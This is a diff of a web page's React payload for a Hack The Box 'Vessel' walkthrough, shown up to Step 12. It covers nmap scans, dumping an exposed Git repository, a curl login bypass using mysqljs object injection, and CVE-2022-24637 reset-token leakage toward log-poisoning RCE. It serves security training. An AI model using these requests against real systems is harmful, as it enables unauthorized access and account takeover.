@@ -4,33 +4,32 @@
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-vessel-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Vessel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Vessel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-09T11:01:30.000Z","children":"9 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-vessel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Vessel machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Vessel machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/vessel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","stage-1-reconnaissance",{"children":["$","a",null,{"href":"#stage-1-reconnaissance","children":"Stage 1 — Reconnaissance"}]}],["$","li","stage-2-web-enumeration",{"children":["$","a",null,{"href":"#stage-2-web-enumeration","children":"Stage 2 — Web Enumeration"}]}],["$","li","stage-3-authentication-bypass",{"children":["$","a",null,{"href":"#stage-3-authentication-bypass","children":"Stage 3 — Authentication Bypass"}]}],["$","li","stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce",{"children":["$","a",null,{"href":"#stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce","children":"Stage 4 — CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)"}]}],"$L4","$L5","$L6","$L7"]}]]}],"$L8"],"$L9","$La",["$Lb","$Lc","$Ld"]]}],"$Le"]}]]}],"$Lf"]}],"$L10","$L11"],null,"$L12"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","li","stage-5-lateral-movement-to-ethan",{"children":["$","a",null,{"href":"#stage-5-lateral-movement-to-ethan","children":"Stage 5 — Lateral Movement to Ethan"}]}]
-5:["$","li","stage-6-privilege-escalation-to-root-cve-2022-0811",{"children":["$","a",null,{"href":"#stage-6-privilege-escalation-to-root-cve-2022-0811","children":"Stage 6 — Privilege Escalation to Root (CVE-2022-0811)"}]}]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Vessel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An exposed Git repository led to a mysqljs type-confusion login bypass, an Open Web Analytics reset-token leak and log poisoning gave a shell, and a predictable password generator unlocked Ethan before the setuid pinns core-pattern flaw created a root shell."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-09T11:01:30.000Z","children":"9 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-vessel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Vessel machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Vessel machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/vessel","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","stage-1-reconnaissance",{"children":["$","a",null,{"href":"#stage-1-reconnaissance","children":"Stage 1: Reconnaissance"}]}],["$","li","stage-2-web-enumeration",{"children":["$","a",null,{"href":"#stage-2-web-enumeration","children":"Stage 2: Web Enumeration"}]}],["$","li","stage-3-authentication-bypass",{"children":["$","a",null,{"href":"#stage-3-authentication-bypass","children":"Stage 3: Authentication Bypass"}]}],["$","li","stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce",{"children":["$","a",null,{"href":"#stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce","children":"Stage 4: CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)"}]}],"$L4","$L5","$L6","$L7"]}]]}],"$L8"],"$L9","$La",["$Lb","$Lc","$Ld"]]}],"$Le"]}]]}],"$Lf"]}],"$L10","$L11"],null,"$L12"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","li","stage-5-lateral-movement-to-ethan",{"children":["$","a",null,{"href":"#stage-5-lateral-movement-to-ethan","children":"Stage 5: Lateral Movement to Ethan"}]}]
+5:["$","li","stage-6-privilege-escalation-to-root-cve-2022-0811",{"children":["$","a",null,{"href":"#stage-6-privilege-escalation-to-root-cve-2022-0811","children":"Stage 6: Privilege Escalation to Root (CVE-2022-0811)"}]}]
 6:["$","li","summary-of-the-full-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-chain","children":"Summary of the Full Chain"}]}]
 7:["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]
-8:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",9," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","stage-1-reconnaissance",{"children":["$","a",null,{"href":"#stage-1-reconnaissance","children":"Stage 1 — Reconnaissance"}]}],["$","li","stage-2-web-enumeration",{"children":["$","a",null,{"href":"#stage-2-web-enumeration","children":"Stage 2 — Web Enumeration"}]}],["$","li","stage-3-authentication-bypass",{"children":["$","a",null,{"href":"#stage-3-authentication-bypass","children":"Stage 3 — Authentication Bypass"}]}],["$","li","stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce",{"children":["$","a",null,{"href":"#stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce","children":"Stage 4 — CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)"}]}],["$","li","stage-5-lateral-movement-to-ethan",{"children":["$","a",null,{"href":"#stage-5-lateral-movement-to-ethan","children":"Stage 5 — Lateral Movement to Ethan"}]}],["$","li","stage-6-privilege-escalation-to-root-cve-2022-0811",{"children":["$","a",null,{"href":"#stage-6-privilege-escalation-to-root-cve-2022-0811","children":"Stage 6 — Privilege Escalation to Root (CVE-2022-0811)"}]}],["$","li","summary-of-the-full-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-chain","children":"Summary of the Full Chain"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]]}]}]]}]
-9:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","9 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/094bffd3afde14eb46aecc95d73f343333668a9e/HTB-Vessel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 094bffd3afde",""]}]]]}]
-a:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Vessel"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/vessel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+8:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",8," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","stage-1-reconnaissance",{"children":["$","a",null,{"href":"#stage-1-reconnaissance","children":"Stage 1: Reconnaissance"}]}],["$","li","stage-2-web-enumeration",{"children":["$","a",null,{"href":"#stage-2-web-enumeration","children":"Stage 2: Web Enumeration"}]}],["$","li","stage-3-authentication-bypass",{"children":["$","a",null,{"href":"#stage-3-authentication-bypass","children":"Stage 3: Authentication Bypass"}]}],["$","li","stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce",{"children":["$","a",null,{"href":"#stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce","children":"Stage 4: CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)"}]}],["$","li","stage-5-lateral-movement-to-ethan",{"children":["$","a",null,{"href":"#stage-5-lateral-movement-to-ethan","children":"Stage 5: Lateral Movement to Ethan"}]}],["$","li","stage-6-privilege-escalation-to-root-cve-2022-0811",{"children":["$","a",null,{"href":"#stage-6-privilege-escalation-to-root-cve-2022-0811","children":"Stage 6: Privilege Escalation to Root (CVE-2022-0811)"}]}],["$","li","summary-of-the-full-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-chain","children":"Summary of the Full Chain"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key Lessons"}]}]]}]}]]}]
+9:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","9 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/094bffd3afde14eb46aecc95d73f343333668a9e/HTB-Vessel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 094bffd3afde",""]}]]]}]
+a:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Vessel, Linux, Hard",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/vessel","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 b:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Vessel machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-c:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-d:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"14 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-13:T6ecb,
-<p><strong>Difficulty:</strong> Hard | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.227.225</p>
-<hr />
-<h2 id="the-hacker-mindset">The Hacker Mindset</h2>
-<p>Before we start — the goal of every HTB machine is to think like an attacker. Every service is an attack surface. Every piece of software has a version. Every version has a history of vulnerabilities. Every developer makes mistakes. Our job is to find those mistakes and chain them together from the outside all the way to root.</p>
-<hr />
-<h2 id="stage-1-reconnaissance">Stage 1 — Reconnaissance</h2>
+c:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+d:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"3 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+13:T6d77,<p><strong>Difficulty:</strong> Hard | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.227.225</p>
+<hr>
+
+<p>Start by mapping the exposed services, software versions, application behavior, and trust boundaries. The route depends on chaining several implementation mistakes.</p>
+<hr>
+<h2 id="stage-1-reconnaissance">Stage 1: Reconnaissance</h2>
 <h3 id="step-1-port-scan-with-nmap">Step 1: Port Scan with Nmap</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.225
 </code></pre>
-<p><strong>Why:</strong> Before you touch anything, you need to know what's listening. <code>-p-</code> scans all 65535 ports (not just the top 1000 that nmap defaults to). <code>--min-rate 10000</code> speeds it up so we're not waiting forever. This is the first thing every attacker does — map the attack surface.</p>
+<p><strong>Why:</strong> Before you touch anything, you need to know what's listening. <code>-p-</code> scans all 65535 ports (not just the top 1000 that nmap defaults to). <code>--min-rate 10000</code> speeds it up so we're not waiting forever. This is the first thing every attacker does - map the attack surface.</p>
 <p><strong>Result:</strong> Ports 22 (SSH) and 80 (HTTP) are open.</p>
 <h3 id="step-2-service-version-scan">Step 2: Service Version Scan</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p 22,80 -sCV 10.129.227.225
 </code></pre>
-<p><strong>Why:</strong> Now that we know which ports are open, we do a deeper scan. <code>-sC</code> runs default scripts (banner grabbing, basic enumeration), <code>-sV</code> detects service versions. Versions matter enormously — an old Apache version might be vulnerable to a known CVE.</p>
+<p><strong>Why:</strong> Now that we know which ports are open, we do a deeper scan. <code>-sC</code> runs default scripts (banner grabbing, basic enumeration), <code>-sV</code> detects service versions. Versions matter enormously - an old Apache version might be vulnerable to a known CVE.</p>
 <p><strong>Result:</strong></p>
 <ul>
 <li>Port 22: OpenSSH 8.2p1 (Ubuntu 20.04)</li>
@@ -40,14 +39,14 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <h3 id="step-3-add-domain-to-etc-hosts">Step 3: Add Domain to /etc/hosts</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.227.225 vessel.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<p><strong>Why:</strong> Web applications often use virtual hosting — the same IP serves different content based on the <code>Host:</code> HTTP header. By adding the domain, our browser/curl will send the right Host header and get the intended site. This also enables subdomain enumeration later.</p>
-<hr />
-<h2 id="stage-2-web-enumeration">Stage 2 — Web Enumeration</h2>
+<p><strong>Why:</strong> Web applications often use virtual hosting - the same IP serves different content based on the <code>Host:</code> HTTP header. By adding the domain, our browser/curl will send the right Host header and get the intended site. This also enables subdomain enumeration later.</p>
+<hr>
+<h2 id="stage-2-web-enumeration">Stage 2: Web Enumeration</h2>
 <h3 id="step-4-discover-the-exposed-git-repository">Step 4: Discover the Exposed Git Repository</h3>
 <pre><code class="language-bash" data-language="bash">curl -s http://vessel.htb/dev/.git/config
 </code></pre>
-<p><strong>Why:</strong> Developers sometimes push code to production servers with the <code>.git</code> directory still present. This is a goldmine — it contains the entire version history, credentials, and source code. The <code>.git/config</code> file is the first thing to check because it reveals if the repo is there without needing a directory listing.</p>
-<p><strong>Result:</strong> The git config reveals developer name <code>Ethan</code> and email <code>ethan@vessel.htb</code>. Usernames are valuable — they can be SSH users, web app users, or give us clues about credentials.</p>
+<p><strong>Why:</strong> Developers sometimes push code to production servers with the <code>.git</code> directory still present. This is a useful source - it contains the entire version history, credentials, and source code. The <code>.git/config</code> file is the first thing to check because it reveals if the repo is there without needing a directory listing.</p>
+<p><strong>Result:</strong> The git config reveals developer name <code>Ethan</code> and email <code>ethan@vessel.htb</code>. Usernames are valuable - they can be SSH users, web app users, or give us clues about credentials.</p>
 <h3 id="step-5-dump-the-git-repository">Step 5: Dump the Git Repository</h3>
 <pre><code class="language-bash" data-language="bash">git-dumper http://vessel.htb/dev ~/Downloads/htb/git
 </code></pre>
@@ -55,61 +54,61 @@ d:["$","div","editorial-correction-2",{"className":"article-review-note article-
 <h3 id="step-6-analyze-the-source-code">Step 6: Analyze the Source Code</h3>
 <pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb/git &amp;&amp; git log --oneline &amp;&amp; cat routes/index.js
 </code></pre>
-<p><strong>Why:</strong> Reading the git log tells us the history of changes. Commit messages like "Security Fixes" are a red flag — they mean there WAS a vulnerability, and we want to see both the old and new code. Reading <code>git diff</code> between commits shows exactly what was "fixed" and helps us understand the developer's intent.</p>
+<p><strong>Why:</strong> Reading the git log tells us the history of changes. Commit messages like "Security Fixes" are a warning sign - they mean there WAS a vulnerability, and we want to see both the old and new code. Reading <code>git diff</code> between commits shows exactly what was "fixed" and helps us understand the developer's intent.</p>
 <p><strong>Key finding in routes/index.js:</strong></p>
-<pre><code class="language-javascript" data-language="javascript">connection.query('SELECT * FROM accounts WHERE username = ? AND password = REDACTED,
+<pre><code class="language-javascript" data-language="javascript">connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?',
     [username, password], function(error, results, fields) {
 </code></pre>
-<p>The developer switched to parameterized queries (the <code>?</code> placeholders) to fix SQL injection. This looks secure at first glance. But — they're using the <code>mysqljs</code> library, which has a known type confusion vulnerability.</p>
-<hr />
-<h2 id="stage-3-authentication-bypass">Stage 3 — Authentication Bypass</h2>
+<p>The developer switched to parameterized queries (the <code>?</code> placeholders) to fix SQL injection. This looks secure at first glance. But - they're using the <code>mysqljs</code> library, which has a known type confusion vulnerability.</p>
+<hr>
+<h2 id="stage-3-authentication-bypass">Stage 3: Authentication Bypass</h2>
 <h3 id="step-7-exploit-mysqljs-type-confusion">Step 7: Exploit mysqljs Type Confusion</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -i -X POST http://vessel.htb/api/login \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=admin&amp;password[password]=1" \
   -c /tmp/vessel_cookies.txt
 </code></pre>
-<p><strong>Why this works:</strong> The <code>mysqljs</code> library is supposed to safely escape the <code>?</code> parameters. But when you pass an <strong>object</strong> instead of a string as a parameter, it behaves unexpectedly. The query becomes:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND password = REDACTED = 1
+<p><strong>Mechanism:</strong> The <code>mysqljs</code> library is supposed to safely escape the <code>?</code> parameters. But when you pass an <strong>object</strong> instead of a string as a parameter, it behaves unexpectedly. The query becomes:</p>
+<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
 </code></pre>
 <p>In MySQL, this evaluates as:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND (password = REDACTED) = 1
+<pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND (password = `password`) = 1
 </code></pre>
-<p><code>password = REDACTED</code> is always true, so it becomes:</p>
+<p><code>password = password</code> is always true, so it becomes:</p>
 <pre><code class="language-sql" data-language="sql">SELECT * FROM accounts WHERE username = 'admin' AND 1 = 1
 </code></pre>
 <p>Which returns the admin row, granting access. The lesson: <strong>parameterized queries are only safe if the library correctly handles all input types</strong>. Object injection into query parameters is a subtle but real vulnerability.</p>
-<p><strong>Hacker mindset:</strong> When you see "Security Fixes" in git history, always check if the fix is complete. Developers often fix the obvious issue but miss edge cases.</p>
-<p><strong>Result:</strong> HTTP 302 redirect to <code>/admin</code> — we're logged in.</p>
+<p> When you see "Security Fixes" in git history, always check if the fix is complete. Developers often fix the obvious issue but miss edge cases.</p>
+<p><strong>Result:</strong> HTTP 302 redirect to <code>/admin</code> - we're logged in.</p>
 <h3 id="step-8-discover-the-analytics-subdomain">Step 8: Discover the Analytics Subdomain</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -b /tmp/vessel_cookies.txt http://vessel.htb/admin | grep -i "openwebanalytics"
 </code></pre>
-<p><strong>Why:</strong> Now that we're authenticated, we explore every page and link. The admin dashboard has an "Analytics" link that points to <code>openwebanalytics.vessel.htb</code>. This is a new virtual host — a completely separate web application with its own attack surface.</p>
+<p><strong>Why:</strong> Now that we're authenticated, we explore every page and link. The admin dashboard has an "Analytics" link that points to <code>openwebanalytics.vessel.htb</code>. This is a new virtual host - a completely separate web application with its own attack surface.</p>
 <pre><code class="language-bash" data-language="bash">echo "10.129.227.225 openwebanalytics.vessel.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<hr />
-<h2 id="stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce">Stage 4 — CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)</h2>
+<hr>
+<h2 id="stage-4-cve-2022-24637-open-web-analytics-info-disclosure-rce">Stage 4: CVE-2022-24637 (Open Web Analytics Info Disclosure → RCE)</h2>
 <h3 id="step-9-identify-owa-version">Step 9: Identify OWA Version</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -L "http://openwebanalytics.vessel.htb/" | grep -i "version"
 </code></pre>
 <p><strong>Result:</strong> OWA version <strong>1.7.3</strong></p>
-<p><strong>Why version matters:</strong> OWA 1.7.3 was released in November 2021. The next version (1.7.4, February 2022) contained a "CRITICAL SECURITY FIX". This tells us 1.7.3 is vulnerable. Always check the version against known CVEs — this is CVE-2022-24637.</p>
+<p><strong>Why version matters:</strong> OWA 1.7.3 was released in November 2021. The next version (1.7.4, February 2022) contained a "CRITICAL SECURITY FIX". This tells us 1.7.3 is vulnerable. Always check the version against known CVEs - this is CVE-2022-24637.</p>
 <h3 id="step-10-understand-cve-2022-24637">Step 10: Understand CVE-2022-24637</h3>
 <p>This CVE has two parts:</p>
-<p><strong>Part 1 — Information Disclosure:</strong> OWA caches PHP objects to disk for performance. These cache files are stored in <code>owa-data/caches/</code> which is <strong>publicly accessible without authentication</strong>. The cache files are meant to be PHP files, but a bug in the caching code writes <code>&lt;?php\n</code> with a literal <code>\n</code> instead of a real newline, breaking the PHP tag. The file is served as plain text instead of being executed — so its contents are readable.</p>
-<p>The cache file for a user contains the <strong>serialized user object</strong>, including the <code>temp_passkey</code> field — a token used for password resets.</p>
-<p><strong>Part 2 — Mass Assignment → Log Poisoning → RCE:</strong> The OWA settings endpoint doesn't whitelist which configuration keys can be updated. By sending arbitrary <code>owa_config[key]</code> parameters, we can set hidden config options like <code>error_log_file</code> (change the log path to a <code>.php</code> file) and then write PHP code into that log file.</p>
+<p><strong>Part 1 - Information Disclosure:</strong> OWA caches PHP objects to disk for performance. These cache files are stored in <code>owa-data/caches/</code> which is <strong>publicly accessible without authentication</strong>. The cache files are meant to be PHP files, but a bug in the caching code writes <code>&lt;?php\n</code> with a literal <code>\n</code> instead of a real newline, breaking the PHP tag. The file is served as plain text instead of being executed - so its contents are readable.</p>
+<p>The cache file for a user contains the <strong>serialized user object</strong>, including the <code>temp_passkey</code> field - a token used for password resets.</p>
+<p><strong>Part 2 - Mass Assignment → Log Poisoning → RCE:</strong> The OWA settings endpoint doesn't whitelist which configuration keys can be updated. By sending arbitrary <code>owa_config[key]</code> parameters, we can set hidden config options like <code>error_log_file</code> (change the log path to a <code>.php</code> file) and then write PHP code into that log file.</p>
 <h3 id="step-11-trigger-password-reset-to-generate-cache">Step 11: Trigger Password Reset to Generate Cache</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -X POST "http://openwebanalytics.vessel.htb/index.php" \
   -d "owa_action=base.passwordResetRequest&amp;owa_email_address=admin@vessel.htb&amp;owa_submit=Request+New+Password"
 </code></pre>
-<p><strong>Why:</strong> A failed login also generates a cache, but the <code>temp_passkey</code> from a failed login isn't written to the database — so it can't be used to change the password. The password reset action (<code>base.passwordResetRequest</code>) <strong>generates a new temp_passkey AND writes it to the database</strong>, making it valid for the password change endpoint.</p>
-<p><strong>Why <code>admin@vessel.htb</code> exists:</strong> We can confirm valid emails via the OWA "Forgot Password" form — it shows different responses for valid vs invalid emails. <code>admin@vessel.htb</code> returns success, confirming the account exists.</p>
+<p><strong>Why:</strong> A failed login also generates a cache, but the <code>temp_passkey</code> from a failed login isn't written to the database - so it can't be used to change the password. The password reset action (<code>base.passwordResetRequest</code>) <strong>generates a new temp_passkey AND writes it to the database</strong>, making it valid for the password change endpoint.</p>
+<p><strong>Why <code>admin@vessel.htb</code> exists:</strong> We can confirm valid emails via the OWA "Forgot Password" form - it shows different responses for valid vs invalid emails. <code>admin@vessel.htb</code> returns success, confirming the account exists.</p>
 <h3 id="step-12-fetch-the-cache-and-extract-temp-passkey">Step 12: Fetch the Cache and Extract temp_passkey</h3>
 <p>The cache filename is predictable: <code>md5("user_id" + user_numeric_id)</code> where the admin's numeric ID is 1.</p>
 <ul>
-<li>Cache path: <code>/owa-data/caches/1/owa_user/[redacted retired-lab hash or flag].php</code>
-(<code>[redacted retired-lab hash or flag]</code> = md5("id1"))</li>
+<li>Cache path: <code>/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php</code>
+(<code>fafe1b60c24107ccd8f4562213e44849</code> = md5("id1"))</li>
 </ul>
 <pre><code class="language-python" data-language="python"># exploit script
 curl cache → base64 decode → deserialize → extract temp_passkey
